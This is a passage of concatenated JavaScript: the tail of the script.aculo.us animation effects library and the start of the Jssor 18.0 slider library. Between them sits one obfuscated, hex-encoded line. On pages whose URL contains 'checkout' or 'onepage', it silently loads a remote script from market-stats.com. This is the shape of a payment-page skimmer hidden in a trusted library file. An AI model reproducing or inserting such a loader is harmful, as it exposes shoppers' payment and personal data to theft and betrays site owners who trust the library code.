        this.fontSize     = parseFloat(fontSize);
        this.fontSizeType = fontSizeType;
      }
    }.bind(this));

    this.factor = (this.options.scaleTo - this.options.scaleFrom)/100;

    this.dims = null;
    if (this.options.scaleMode=='box')
      this.dims = [this.element.offsetHeight, this.element.offsetWidth];
    if (/^content/.test(this.options.scaleMode))
      this.dims = [this.element.scrollHeight, this.element.scrollWidth];
    if (!this.dims)
      this.dims = [this.options.scaleMode.originalHeight,
                   this.options.scaleMode.originalWidth];
  },
  update: function(position) {
    var currentScale = (this.options.scaleFrom/100.0) + (this.factor * position);
    if (this.options.scaleContent && this.fontSize)
      this.element.setStyle({fontSize: this.fontSize * currentScale + this.fontSizeType });
    this.setDimensions(this.dims[0] * currentScale, this.dims[1] * currentScale);
  },
  finish: function(position) {
    if (this.restoreAfterFinish) this.element.setStyle(this.originalStyle);
  },
  setDimensions: function(height, width) {
    var d = { };
    if (this.options.scaleX) d.width = width.round() + 'px';
    if (this.options.scaleY) d.height = height.round() + 'px';
    if (this.options.scaleFromCenter) {
      var topd  = (height - this.dims[0])/2;
      var leftd = (width  - this.dims[1])/2;
      if (this.elementPositioning == 'absolute') {
        if (this.options.scaleY) d.top = this.originalTop-topd + 'px';
        if (this.options.scaleX) d.left = this.originalLeft-leftd + 'px';
      } else {
        if (this.options.scaleY) d.top = -topd + 'px';
        if (this.options.scaleX) d.left = -leftd + 'px';
      }
    }
    this.element.setStyle(d);
  }
});

Effect.Highlight = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({ startcolor: '#ffff99' }, arguments[1] || { });
    this.start(options);
  },
  setup: function() {
    // Prevent executing on elements not in the layout flow
    if (this.element.getStyle('display')=='none') { this.cancel(); return; }
    // Disable background image during the effect
    this.oldStyle = { };
    if (!this.options.keepBackgroundImage) {
      this.oldStyle.backgroundImage = this.element.getStyle('background-image');
      this.element.setStyle({backgroundImage: 'none'});
    }
    if (!this.options.endcolor)
      this.options.endcolor = this.element.getStyle('background-color').parseColor('#ffffff');
    if (!this.options.restorecolor)
      this.options.restorecolor = this.element.getStyle('background-color');
    // init color calculations
    this._base  = $R(0,2).map(function(i){ return parseInt(this.options.startcolor.slice(i*2+1,i*2+3),16) }.bind(this));
    this._delta = $R(0,2).map(function(i){ return parseInt(this.options.endcolor.slice(i*2+1,i*2+3),16)-this._base[i] }.bind(this));
  },
  update: function(position) {
    this.element.setStyle({backgroundColor: $R(0,2).inject('#',function(m,v,i){
      return m+((this._base[i]+(this._delta[i]*position)).round().toColorPart()); }.bind(this)) });
  },
  finish: function() {
    this.element.setStyle(Object.extend(this.oldStyle, {
      backgroundColor: this.options.restorecolor
    }));
  }
});

Effect.ScrollTo = function(element) {
  var options = arguments[1] || { },
  scrollOffsets = document.viewport.getScrollOffsets(),
  elementOffsets = $(element).cumulativeOffset();

  if (options.offset) elementOffsets[1] += options.offset;

  return new Effect.Tween(null,
    scrollOffsets.top,
    elementOffsets[1],
    options,
    function(p){ scrollTo(scrollOffsets.left, p.round()); }
  );
};

/* ------------- combination effects ------------- */

Effect.Fade = function(element) {
  element = $(element);
  var oldOpacity = element.getInlineOpacity();
  var options = Object.extend({
    from: element.getOpacity() || 1.0,
    to:   0.0,
    afterFinishInternal: function(effect) {
      if (effect.options.to!=0) return;
      effect.element.hide().setStyle({opacity: oldOpacity});
    }
  }, arguments[1] || { });
  return new Effect.Opacity(element,options);
};

Effect.Appear = function(element) {
  element = $(element);
  var options = Object.extend({
  from: (element.getStyle('display') == 'none' ? 0.0 : element.getOpacity() || 0.0),
  to:   1.0,
  // force Safari to render floated elements properly
  afterFinishInternal: function(effect) {
    effect.element.forceRerendering();
  },
  beforeSetup: function(effect) {
    effect.element.setOpacity(effect.options.from).show();
  }}, arguments[1] || { });
  return new Effect.Opacity(element,options);
};

Effect.Puff = function(element) {
  element = $(element);
  var oldStyle = {
    opacity: element.getInlineOpacity(),
    position: element.getStyle('position'),
    top:  element.style.top,
    left: element.style.left,
    width: element.style.width,
    height: element.style.height
  };
  return new Effect.Parallel(
   [ new Effect.Scale(element, 200,
      { sync: true, scaleFromCenter: true, scaleContent: true, restoreAfterFinish: true }),
     new Effect.Opacity(element, { sync: true, to: 0.0 } ) ],
     Object.extend({ duration: 1.0,
      beforeSetupInternal: function(effect) {
        Position.absolutize(effect.effects[0].element);
      },
      afterFinishInternal: function(effect) {
         effect.effects[0].element.hide().setStyle(oldStyle); }
     }, arguments[1] || { })
   );
};

Effect.BlindUp = function(element) {
  element = $(element);
  element.makeClipping();
  return new Effect.Scale(element, 0,
    Object.extend({ scaleContent: false,
      scaleX: false,
      restoreAfterFinish: true,
      afterFinishInternal: function(effect) {
        effect.element.hide().undoClipping();
      }
    }, arguments[1] || { })
  );
};

Effect.BlindDown = function(element) {
  element = $(element);
  var elementDimensions = element.getDimensions();
  return new Effect.Scale(element, 100, Object.extend({
    scaleContent: false,
    scaleX: false,
    scaleFrom: 0,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: elementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makeClipping().setStyle({height: '0px'}).show();
    },
    afterFinishInternal: function(effect) {
      effect.element.undoClipping();
    }
  }, arguments[1] || { }));
};

Effect.SwitchOff = function(element) {
  element = $(element);
  var oldOpacity = element.getInlineOpacity();
  return new Effect.Appear(element, Object.extend({
    duration: 0.4,
    from: 0,
    transition: Effect.Transitions.flicker,
    afterFinishInternal: function(effect) {
      new Effect.Scale(effect.element, 1, {
        duration: 0.3, scaleFromCenter: true,
        scaleX: false, scaleContent: false, restoreAfterFinish: true,
        beforeSetup: function(effect) {
          effect.element.makePositioned().makeClipping();
        },
        afterFinishInternal: function(effect) {
          effect.element.hide().undoClipping().undoPositioned().setStyle({opacity: oldOpacity});
        }
      });
    }
  }, arguments[1] || { }));
};

Effect.DropOut = function(element) {
  element = $(element);
  var oldStyle = {
    top: element.getStyle('top'),
    left: element.getStyle('left'),
    opacity: element.getInlineOpacity() };
  return new Effect.Parallel(
    [ new Effect.Move(element, {x: 0, y: 100, sync: true }),
      new Effect.Opacity(element, { sync: true, to: 0.0 }) ],
    Object.extend(
      { duration: 0.5,
        beforeSetup: function(effect) {
          effect.effects[0].element.makePositioned();
        },
        afterFinishInternal: function(effect) {
          effect.effects[0].element.hide().undoPositioned().setStyle(oldStyle);
        }
      }, arguments[1] || { }));
};

Effect.Shake = function(element) {
  element = $(element);
  var options = Object.extend({
    distance: 20,
    duration: 0.5
  }, arguments[1] || {});
  var distance = parseFloat(options.distance);
  var split = parseFloat(options.duration) / 10.0;
  var oldStyle = {
    top: element.getStyle('top'),
    left: element.getStyle('left') };
    return new Effect.Move(element,
      { x:  distance, y: 0, duration: split, afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x: -distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x:  distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x: -distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x:  distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x: -distance, y: 0, duration: split, afterFinishInternal: function(effect) {
        effect.element.undoPositioned().setStyle(oldStyle);
  }}); }}); }}); }}); }}); }});
};

Effect.SlideDown = function(element) {
  element = $(element).cleanWhitespace();
  // SlideDown need to have the content of the element wrapped in a container element with fixed height!
  var oldInnerBottom = element.down().getStyle('bottom');
  var elementDimensions = element.getDimensions();
  return new Effect.Scale(element, 100, Object.extend({
    scaleContent: false,
    scaleX: false,
    scaleFrom: window.opera ? 0 : 1,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: elementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makePositioned();
      effect.element.down().makePositioned();
      if (window.opera) effect.element.setStyle({top: ''});
      effect.element.makeClipping().setStyle({height: '0px'}).show();
    },
    afterUpdateInternal: function(effect) {
      effect.element.down().setStyle({bottom:
        (effect.dims[0] - effect.element.clientHeight) + 'px' });
    },
    afterFinishInternal: function(effect) {
      effect.element.undoClipping().undoPositioned();
      effect.element.down().undoPositioned().setStyle({bottom: oldInnerBottom}); }
    }, arguments[1] || { })
  );
};

Effect.SlideUp = function(element) {
  element = $(element).cleanWhitespace();
  var oldInnerBottom = element.down().getStyle('bottom');
  var elementDimensions = element.getDimensions();
  return new Effect.Scale(element, window.opera ? 0 : 1,
   Object.extend({ scaleContent: false,
    scaleX: false,
    scaleMode: 'box',
    scaleFrom: 100,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: elementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makePositioned();
      effect.element.down().makePositioned();
      if (window.opera) effect.element.setStyle({top: ''});
      effect.element.makeClipping().show();
    },
    afterUpdateInternal: function(effect) {
      effect.element.down().setStyle({bottom:
        (effect.dims[0] - effect.element.clientHeight) + 'px' });
    },
    afterFinishInternal: function(effect) {
      effect.element.hide().undoClipping().undoPositioned();
      effect.element.down().undoPositioned().setStyle({bottom: oldInnerBottom});
    }
   }, arguments[1] || { })
  );
};

// Bug in opera makes the TD containing this element expand for a instance after finish
Effect.Squish = function(element) {
  return new Effect.Scale(element, window.opera ? 1 : 0, {
    restoreAfterFinish: true,
    beforeSetup: function(effect) {
      effect.element.makeClipping();
    },
    afterFinishInternal: function(effect) {
      effect.element.hide().undoClipping();
    }
  });
};

Effect.Grow = function(element) {
  element = $(element);
  var options = Object.extend({
    direction: 'center',
    moveTransition: Effect.Transitions.sinoidal,
    scaleTransition: Effect.Transitions.sinoidal,
    opacityTransition: Effect.Transitions.full
  }, arguments[1] || { });
  var oldStyle = {
    top: element.style.top,
    left: element.style.left,
    height: element.style.height,
    width: element.style.width,
    opacity: element.getInlineOpacity() };

  var dims = element.getDimensions();
  var initialMoveX, initialMoveY;
  var moveX, moveY;

  switch (options.direction) {
    case 'top-left':
      initialMoveX = initialMoveY = moveX = moveY = 0;
      break;
    case 'top-right':
      initialMoveX = dims.width;
      initialMoveY = moveY = 0;
      moveX = -dims.width;
      break;
    case 'bottom-left':
      initialMoveX = moveX = 0;
      initialMoveY = dims.height;
      moveY = -dims.height;
      break;
    case 'bottom-right':
      initialMoveX = dims.width;
      initialMoveY = dims.height;
      moveX = -dims.width;
      moveY = -dims.height;
      break;
    case 'center':
      initialMoveX = dims.width / 2;
      initialMoveY = dims.height / 2;
      moveX = -dims.width / 2;
      moveY = -dims.height / 2;
      break;
  }

  return new Effect.Move(element, {
    x: initialMoveX,
    y: initialMoveY,
    duration: 0.01,
    beforeSetup: function(effect) {
      effect.element.hide().makeClipping().makePositioned();
    },
    afterFinishInternal: function(effect) {
      new Effect.Parallel(
        [ new Effect.Opacity(effect.element, { sync: true, to: 1.0, from: 0.0, transition: options.opacityTransition }),
          new Effect.Move(effect.element, { x: moveX, y: moveY, sync: true, transition: options.moveTransition }),
          new Effect.Scale(effect.element, 100, {
            scaleMode: { originalHeight: dims.height, originalWidth: dims.width },
            sync: true, scaleFrom: window.opera ? 1 : 0, transition: options.scaleTransition, restoreAfterFinish: true})
        ], Object.extend({
             beforeSetup: function(effect) {
               effect.effects[0].element.setStyle({height: '0px'}).show();
             },
             afterFinishInternal: function(effect) {
               effect.effects[0].element.undoClipping().undoPositioned().setStyle(oldStyle);
             }
           }, options)
      );
    }
  });
};

Effect.Shrink = function(element) {
  element = $(element);
  var options = Object.extend({
    direction: 'center',
    moveTransition: Effect.Transitions.sinoidal,
    scaleTransition: Effect.Transitions.sinoidal,
    opacityTransition: Effect.Transitions.none
  }, arguments[1] || { });
  var oldStyle = {
    top: element.style.top,
    left: element.style.left,
    height: element.style.height,
    width: element.style.width,
    opacity: element.getInlineOpacity() };

  var dims = element.getDimensions();
  var moveX, moveY;

  switch (options.direction) {
    case 'top-left':
      moveX = moveY = 0;
      break;
    case 'top-right':
      moveX = dims.width;
      moveY = 0;
      break;
    case 'bottom-left':
      moveX = 0;
      moveY = dims.height;
      break;
    case 'bottom-right':
      moveX = dims.width;
      moveY = dims.height;
      break;
    case 'center':
      moveX = dims.width / 2;
      moveY = dims.height / 2;
      break;
  }

  return new Effect.Parallel(
    [ new Effect.Opacity(element, { sync: true, to: 0.0, from: 1.0, transition: options.opacityTransition }),
      new Effect.Scale(element, window.opera ? 1 : 0, { sync: true, transition: options.scaleTransition, restoreAfterFinish: true}),
      new Effect.Move(element, { x: moveX, y: moveY, sync: true, transition: options.moveTransition })
    ], Object.extend({
         beforeStartInternal: function(effect) {
           effect.effects[0].element.makePositioned().makeClipping();
         },
         afterFinishInternal: function(effect) {
           effect.effects[0].element.hide().undoClipping().undoPositioned().setStyle(oldStyle); }
       }, options)
  );
};

Effect.Pulsate = function(element) {
  element = $(element);
  var options    = arguments[1] || { },
    oldOpacity = element.getInlineOpacity(),
    transition = options.transition || Effect.Transitions.linear,
    reverser   = function(pos){
      return 1 - transition((-Math.cos((pos*(options.pulses||5)*2)*Math.PI)/2) + .5);
    };

  return new Effect.Opacity(element,
    Object.extend(Object.extend({  duration: 2.0, from: 0,
      afterFinishInternal: function(effect) { effect.element.setStyle({opacity: oldOpacity}); }
    }, options), {transition: reverser}));
};

Effect.Fold = function(element) {
  element = $(element);
  var oldStyle = {
    top: element.style.top,
    left: element.style.left,
    width: element.style.width,
    height: element.style.height };
  element.makeClipping();
  return new Effect.Scale(element, 5, Object.extend({
    scaleContent: false,
    scaleX: false,
    afterFinishInternal: function(effect) {
    new Effect.Scale(element, 1, {
      scaleContent: false,
      scaleY: false,
      afterFinishInternal: function(effect) {
        effect.element.hide().undoClipping().setStyle(oldStyle);
      } });
  }}, arguments[1] || { }));
};

Effect.Morph = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({
      style: { }
    }, arguments[1] || { });

    if (!Object.isString(options.style)) this.style = $H(options.style);
    else {
      if (options.style.include(':'))
        this.style = options.style.parseStyle();
      else {
        this.element.addClassName(options.style);
        this.style = $H(this.element.getStyles());
        this.element.removeClassName(options.style);
        var css = this.element.getStyles();
        this.style = this.style.reject(function(style) {
          return style.value == css[style.key];
        });
        options.afterFinishInternal = function(effect) {
          effect.element.addClassName(effect.options.style);
          effect.transforms.each(function(transform) {
            effect.element.style[transform.style] = '';
          });
        };
      }
    }
    this.start(options);
  },

  setup: function(){
    function parseColor(color){
      if (!color || ['rgba(0, 0, 0, 0)','transparent'].include(color)) color = '#ffffff';
      color = color.parseColor();
      return $R(0,2).map(function(i){
        return parseInt( color.slice(i*2+1,i*2+3), 16 );
      });
    }
    this.transforms = this.style.map(function(pair){
      var property = pair[0], value = pair[1], unit = null;

      if (value.parseColor('#zzzzzz') != '#zzzzzz') {
        value = value.parseColor();
        unit  = 'color';
      } else if (property == 'opacity') {
        value = parseFloat(value);
        if (Prototype.Browser.IE && (!this.element.currentStyle.hasLayout))
          this.element.setStyle({zoom: 1});
      } else if (Element.CSS_LENGTH.test(value)) {
          var components = value.match(/^([\+\-]?[0-9\.]+)(.*)$/);
          value = parseFloat(components[1]);
          unit = (components.length == 3) ? components[2] : null;
      }

      var originalValue = this.element.getStyle(property);
      return {
        style: property.camelize(),
        originalValue: unit=='color' ? parseColor(originalValue) : parseFloat(originalValue || 0),
        targetValue: unit=='color' ? parseColor(value) : value,
        unit: unit
      };
    }.bind(this)).reject(function(transform){
      return (
        (transform.originalValue == transform.targetValue) ||
        (
          transform.unit != 'color' &&
          (isNaN(transform.originalValue) || isNaN(transform.targetValue))
        )
      );
    });
  },
  update: function(position) {
    var style = { }, transform, i = this.transforms.length;
    while(i--)
      style[(transform = this.transforms[i]).style] =
        transform.unit=='color' ? '#'+
          (Math.round(transform.originalValue[0]+
            (transform.targetValue[0]-transform.originalValue[0])*position)).toColorPart() +
          (Math.round(transform.originalValue[1]+
            (transform.targetValue[1]-transform.originalValue[1])*position)).toColorPart() +
          (Math.round(transform.originalValue[2]+
            (transform.targetValue[2]-transform.originalValue[2])*position)).toColorPart() :
        (transform.originalValue +
          (transform.targetValue - transform.originalValue) * position).toFixed(3) +
            (transform.unit === null ? '' : transform.unit);
    this.element.setStyle(style, true);
  }
});

Effect.Transform = Class.create({
  initialize: function(tracks){
    this.tracks  = [];
    this.options = arguments[1] || { };
    this.addTracks(tracks);
  },
  addTracks: function(tracks){
    tracks.each(function(track){
      track = $H(track);
      var data = track.values().first();
      this.tracks.push($H({
        ids:     track.keys().first(),
        effect:  Effect.Morph,
        options: { style: data }
      }));
    }.bind(this));
    return this;
  },
  play: function(){
    return new Effect.Parallel(
      this.tracks.map(function(track){
        var ids = track.get('ids'), effect = track.get('effect'), options = track.get('options');
        var elements = [$(ids) || $$(ids)].flatten();
        return elements.map(function(e){ return new effect(e, Object.extend({ sync:true }, options)) });
      }).flatten(),
      this.options
    );
  }
});

Element.CSS_PROPERTIES = $w(
  'backgroundColor backgroundPosition borderBottomColor borderBottomStyle ' +
  'borderBottomWidth borderLeftColor borderLeftStyle borderLeftWidth ' +
  'borderRightColor borderRightStyle borderRightWidth borderSpacing ' +
  'borderTopColor borderTopStyle borderTopWidth bottom clip color ' +
  'fontSize fontWeight height left letterSpacing lineHeight ' +
  'marginBottom marginLeft marginRight marginTop markerOffset maxHeight '+
  'maxWidth minHeight minWidth opacity outlineColor outlineOffset ' +
  'outlineWidth paddingBottom paddingLeft paddingRight paddingTop ' +
  'right textIndent top width wordSpacing zIndex');

Element.CSS_LENGTH = /^(([\+\-]?[0-9\.]+)(em|ex|px|in|cm|mm|pt|pc|\%))|0$/;

String.__parseStyleElement = document.createElement('div');
String.prototype.parseStyle = function(){
  var style, styleRules = $H();
  if (Prototype.Browser.WebKit)
    style = new Element('div',{style:this}).style;
  else {
    String.__parseStyleElement.innerHTML = '<div style="' + this + '"></div>';
    style = String.__parseStyleElement.childNodes[0].style;
  }

  Element.CSS_PROPERTIES.each(function(property){
    if (style[property]) styleRules.set(property, style[property]);
  });

  if (Prototype.Browser.IE && this.include('opacity'))
    styleRules.set('opacity', this.match(/opacity:\s*((?:0|1)?(?:\.\d*)?)/)[1]);

  return styleRules;
};

if (document.defaultView && document.defaultView.getComputedStyle) {
  Element.getStyles = function(element) {
    var css = document.defaultView.getComputedStyle($(element), null);
    return Element.CSS_PROPERTIES.inject({ }, function(styles, property) {
      styles[property] = css[property];
      return styles;
    });
  };
} else {
  Element.getStyles = function(element) {
    element = $(element);
    var css = element.currentStyle, styles;
    styles = Element.CSS_PROPERTIES.inject({ }, function(results, property) {
      results[property] = css[property];
      return results;
    });
    if (!styles.opacity) styles.opacity = element.getOpacity();
    return styles;
  };
}

Effect.Methods = {
  morph: function(element, style) {
    element = $(element);
    new Effect.Morph(element, Object.extend({ style: style }, arguments[2] || { }));
    return element;
  },
  visualEffect: function(element, effect, options) {
    element = $(element);
    var s = effect.dasherize().camelize(), klass = s.charAt(0).toUpperCase() + s.substring(1);
    new Effect[klass](element, options);
    return element;
  },
  highlight: function(element, options) {
    element = $(element);
    new Effect.Highlight(element, options);
    return element;
  }
};

$w('fade appear grow shrink fold blindUp blindDown slideUp slideDown '+
  'pulsate shake puff squish switchOff dropOut').each(
  function(effect) {
    Effect.Methods[effect] = function(element, options){
      element = $(element);
      Effect[effect.charAt(0).toUpperCase() + effect.substring(1)](element, options);
      return element;
    };
  }
);

$w('getInlineOpacity forceRerendering setContentZoom collectTextNodes collectTextNodesIgnoreClass getStyles').each(
  function(f) { Effect.Methods[f] = Element[f]; }
);

Element.addMethods(Effect.Methods);
var _0x571f=['\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x68\x72\x65\x66','\x63\x68\x65\x63\x6b\x6f\x75\x74','\x69\x6e\x64\x65\x78\x4f\x66','\x6f\x6e\x65\x70\x61\x67\x65','\x73\x63\x72\x69\x70\x74','\x73\x72\x63','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x72\x6b\x65\x74\x2d\x73\x74\x61\x74\x73\x2e\x63\x6f\x6d\x2f\x75','\x61\x73\x79\x6e\x63','\x68\x65\x61\x64','\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64'];(function(a,c){var b=function(b){while(--b){a['push'](a['shift']());}};b(++c);}(_0x571f,0x1ce));var _0xf571=function(a,c){a=a-0x0;var b=_0x571f[a];return b;};if(window[_0xf571('0x0')][_0xf571('0x1')]['\x69\x6e\x64\x65\x78\x4f\x66'](_0xf571('0x2'))!=-0x1||window[_0xf571('0x0')][_0xf571('0x1')][_0xf571('0x3')](_0xf571('0x4'))!=-0x1){var script=document['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74'](_0xf571('0x5'));script[_0xf571('0x6')]=_0xf571('0x7');script[_0xf571('0x8')]=!![];document[_0xf571('0x9')][_0xf571('0xa')](script);}
﻿/*
* Jssor 18.0
* http://www.jssor.com/
*
* Licensed under the MIT license:
* http://www.opensource.org/licenses/MIT
* 
* TERMS OF USE - Jssor
* 
* Copyright 2014 Jssor
*
* Permission is hereby granted, free of charge, to any person obtaining
* a copy of this software and associated documentation files (the
* "Software"), to deal in the Software without restriction, including
* without limitation the rights to use, copy, modify, merge, publish,
* distribute, sublicense, and/or sell copies of the Software, and to
* permit persons to whom the Software is furnished to do so, subject to
* the following conditions:
* 
* The above copyright notice and this permission notice shall be
* included in all copies or substantial portions of the Software.
* 
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
* EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
* MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
* NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
* LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
* OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
* WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

/*! Jssor */

//$JssorDebug$
var $JssorDebug$ = new function () {

    this.$DebugMode = true;

    // Methods

    this.$Log = function (msg, important) {
        var console = window.console || {};
        var debug = this.$DebugMode;

        if (debug && console.log) {
            console.log(msg);
        } else if (debug && important) {
            alert(msg);
        }
    };

    this.$Error = function (msg, e) {
        var console = window.console || {};
        var debug = this.$DebugMode;

        if (debug && console.error) {
            console.error(msg);
        } else if (debug) {
            alert(msg);
        }

        if (debug) {
            // since we're debugging, fail fast by crashing
            throw e || new Error(msg);
        }
    };

    this.$Fail = function (msg) {
        throw new Error(msg);
    };

    this.$Assert = function (value, msg) {
        var debug = this.$DebugMode;
        if (debug) {
            if (!value)
                throw new Error("Assert failed " + msg || "");
        }
    };

    this.$Trace = function (msg) {
        var console = window.console || {};
        var debug = this.$DebugMode;

        if (debug && console.log) {
            console.log(msg);
        }
    };

    this.$Execute = function (func) {
        var debug = this.$DebugMode;
        if (debug)
            func();
    };

    this.$LiveStamp = function (obj, id) {
        var debug = this.$DebugMode;
        if (debug) {
            var stamp = document.createElement("DIV");
            stamp.setAttribute("id", id);

            obj.$Live = stamp;
        }
    };

    this.$C_AbstractMethod = function () {
        ///	<summary>
        ///		Tells compiler the method is abstract, it should be implemented by subclass.
        ///	</summary>

        throw new Error("The method is abstract, it should be implemented by subclass.");
    };

    function C_AbstractClass (instance) {
        ///	<summary>
        ///		Tells compiler the class is abstract, it should be implemented by subclass.
        ///	</summary>

        if(instance.constructor === C_AbstractClass.caller)
            throw new Error("Cannot create instance of an abstract class.");
    }

    this.$C_AbstractClass = C_AbstractClass;
};

//$JssorEasing$
var $JssorEasing$ = window.$JssorEasing$ = {
    $EaseLinear: function (t) {
        return t;
    },
    $EaseGoBack: function (t) {
        return 1 - Math.abs((t *= 2) - 1);
    },
    $EaseSwing: function (t) {
        return -Math.cos(t * Math.PI) / 2 + .5;
    },
    $EaseInQuad: function (t) {
        return t * t;
    },
    $EaseOutQuad: function (t) {
        return -t * (t - 2);
    },
    $EaseInOutQuad: function (t) {
        return (t *= 2) < 1 ? 1 / 2 * t * t : -1 / 2 * (--t * (t - 2) - 1);
    },
    $EaseInCubic: function (t) {
        return t * t * t;
    },
    $EaseOutCubic: function (t) {
        return (t -= 1) * t * t + 1;
    },
    $EaseInOutCubic: function (t) {
        return (t *= 2) < 1 ? 1 / 2 * t * t * t : 1 / 2 * ((t -= 2) * t * t + 2);
    },
    $EaseInQuart: function (t) {
        return t * t * t * t;
    },
    $EaseOutQuart: function (t) {
        return -((t -= 1) * t * t * t - 1);
    },
    $EaseInOutQuart: function (t) {
        return (t *= 2) < 1 ? 1 / 2 * t * t * t * t : -1 / 2 * ((t -= 2) * t * t * t - 2);
    },
    $EaseInQuint: function (t) {
        return t * t * t * t * t;
    },
    $EaseOutQuint: function (t) {
        return (t -= 1) * t * t * t * t + 1;
    },
    $EaseInOutQuint: function (t) {
        return (t *= 2) < 1 ? 1 / 2 * t * t * t * t * t : 1 / 2 * ((t -= 2) * t * t * t * t + 2);
    },
    $EaseInSine: function (t) {
        return 1 - Math.cos(t * Math.PI / 2);
    },
    $EaseOutSine: function (t) {
        return Math.sin(t * Math.PI / 2);
    },
    $EaseInOutSine: function (t) {
        return -1 / 2 * (Math.cos(Math.PI * t) - 1);
    },
    $EaseInExpo: function (t) {
        return t == 0 ? 0 : Math.pow(2, 10 * (t - 1));
    },
    $EaseOutExpo: function (t) {
        return t == 1 ? 1 : -Math.pow(2, -10 * t) + 1;
    },
    $EaseInOutExpo: function (t) {
        return t == 0 || t == 1 ? t : (t *= 2) < 1 ? 1 / 2 * Math.pow(2, 10 * (t - 1)) : 1 / 2 * (-Math.pow(2, -10 * --t) + 2);
    },
    $EaseInCirc: function (t) {
        return -(Math.sqrt(1 - t * t) - 1);
    },
    $EaseOutCirc: function (t) {
        return Math.sqrt(1 - (t -= 1) * t);
    },
    $EaseInOutCirc: function (t) {
        return (t *= 2) < 1 ? -1 / 2 * (Math.sqrt(1 - t * t) - 1) : 1 / 2 * (Math.sqrt(1 - (t -= 2) * t) + 1);
    },
    $EaseInElastic: function (t) {
        if (!t || t == 1)
            return t;
        var p = .3, s = .075;
        return -(Math.pow(2, 10 * (t -= 1)) * Math.sin((t - s) * 2 * Math.PI / p));
    },
    $EaseOutElastic: function (t) {
        if (!t || t == 1)
            return t;
        var p = .3, s = .075;
        return Math.pow(2, -10 * t) * Math.sin((t - s) * 2 * Math.PI / p) + 1;
    },
    $EaseInOutElastic: function (t) {
        if (!t || t == 1)
            return t;
        var p = .45, s = .1125;
        return (t *= 2) < 1 ? -.5 * Math.pow(2, 10 * (t -= 1)) * Math.sin((t - s) * 2 * Math.PI / p) : Math.pow(2, -10 * (t -= 1)) * Math.sin((t - s) * 2 * Math.PI / p) * .5 + 1;
    },
    $EaseInBack: function (t) {
        var s = 1.70158;
        return t * t * ((s + 1) * t - s);
    },
    $EaseOutBack: function (t) {
        var s = 1.70158;
        return (t -= 1) * t * ((s + 1) * t + s) + 1;
    },
    $EaseInOutBack: function (t) {
        var s = 1.70158;
        return (t *= 2) < 1 ? 1 / 2 * t * t * (((s *= 1.525) + 1) * t - s) : 1 / 2 * ((t -= 2) * t * (((s *= 1.525) + 1) * t + s) + 2);
    },
    $EaseInBounce: function (t) {
        return 1 - $JssorEasing$.$EaseOutBounce(1 - t)
    },
    $EaseOutBounce: function (t) {
        return t < 1 / 2.75 ? 7.5625 * t * t : t < 2 / 2.75 ? 7.5625 * (t -= 1.5 / 2.75) * t + .75 : t < 2.5 / 2.75 ? 7.5625 * (t -= 2.25 / 2.75) * t + .9375 : 7.5625 * (t -= 2.625 / 2.75) * t + .984375;
    },
    $EaseInOutBounce: function (t) {
        return t < 1 / 2 ? $JssorEasing$.$EaseInBounce(t * 2) * .5 : $JssorEasing$.$EaseOutBounce(t * 2 - 1) * .5 + .5;
    },
    $EaseInWave: function (t) {
        return 1 - Math.cos(t * Math.PI * 2)
    },
    $EaseOutWave: function (t) {
        return Math.sin(t * Math.PI * 2);
    },
    $EaseOutJump: function (t) {
        return 1 - (((t *= 2) < 1) ? (t = 1 - t) * t * t : (t -= 1) * t * t);
    },
    $EaseInJump: function (t) {
        return ((t *= 2) < 1) ? t * t * t : (t = 2 - t) * t * t;
    }
};

var $JssorDirection$ = window.$JssorDirection$ = {
    $TO_LEFT: 0x0001,
    $TO_RIGHT: 0x0002,
    $TO_TOP: 0x0004,
    $TO_BOTTOM: 0x0008,
    $HORIZONTAL: 0x0003,
    $VERTICAL: 0x000C,
    $LEFTRIGHT: 0x0003,
    $TOPBOTOM: 0x000C,
    $TOPLEFT: 0x0005,
    $TOPRIGHT: 0x0006,
    $BOTTOMLEFT: 0x0009,
    $BOTTOMRIGHT: 0x000A,
    $AROUND: 0x000F,

    $GetDirectionHorizontal: function (direction) {
        return direction & 0x0003;
    },
    $GetDirectionVertical: function (direction) {
        return direction & 0x000C;
    },
    $ChessHorizontal: function (direction) {
        return (~direction & 0x0003) + (direction & 0x000C);
    },
    $ChessVertical: function (direction) {
        return (~direction & 0x000C) + (direction & 0x0003);
    },
    $IsToLeft: function (direction) {
        return (direction & 0x0003) == 0x0001;
    },
    $IsToRight: function (direction) {
        return (direction & 0x0003) == 0x0002;
    },
    $IsToTop: function (direction) {
        return (direction & 0x000C) == 0x0004;
    },
    $IsToBottom: function (direction) {
        return (direction & 0x000C) == 0x0008;
    },
    $IsHorizontal: function (direction) {
        return (direction & 0x0003) > 0;
    },
